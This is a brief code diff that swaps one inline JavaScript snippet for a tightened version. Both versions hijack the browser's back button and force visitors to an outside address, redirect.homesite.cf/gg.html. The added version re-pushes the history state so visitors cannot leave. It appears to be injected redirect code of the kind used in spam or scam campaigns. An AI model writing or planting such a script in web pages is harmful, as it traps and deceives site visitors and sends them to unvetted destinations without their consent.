@@ -1,6 +1,2 @@
-<script type="text/javascript">
-   window.history.pushState(null, null, window.location.href);
-window.onpopstate = function () {
-    var url = "https://redirect.homesite.cf/gg.html"; location.replace(url);
-};
-   </script>
+<script type='text/javascript'>
+history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); var url = "https://redirect.homesite.cf/gg.html"; location.replace(url); }); </script>
